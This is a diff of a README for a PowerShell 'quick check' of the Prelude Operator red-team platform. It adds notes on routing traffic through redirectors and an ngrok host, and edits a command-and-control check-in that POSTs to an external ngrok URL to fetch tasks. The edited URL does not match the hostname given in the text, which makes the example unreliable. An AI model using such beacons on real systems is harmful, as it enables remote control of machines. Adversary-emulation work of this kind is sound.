@@ -1,6 +1,8 @@
 # PreludeOperator_QuickCheck
 Simple Powershell Prelude Operator Quick Check
 
+In this example, we will use `boomtown.ngrok.io` There are a couple ways to reidrect HTTP.  The preferred method is a Gateway Redirector.
+[Cloudy with a chance of redirectors](https://feed.prelude.org/p/cloudy-with-a-chance-of-redirectors)
 
 ## Create a TTP
 
@@ -45,7 +47,7 @@ $jsonBase = [pscustomobject]@{
 $delivery = $jsonBase | ConvertTo-Json
 # Checkin - Get Task
 
-$response = Invoke-RestMethod -Uri "https://boomtown.ngrok.io" -Method Post -Body $delivery -ContentType "application/json"
+$response = Invoke-RestMethod -Uri "https://bdoomtown.ngrok.io" -Method Post -Body $delivery -ContentType "application/json"
 ```
 
 You should have a call back
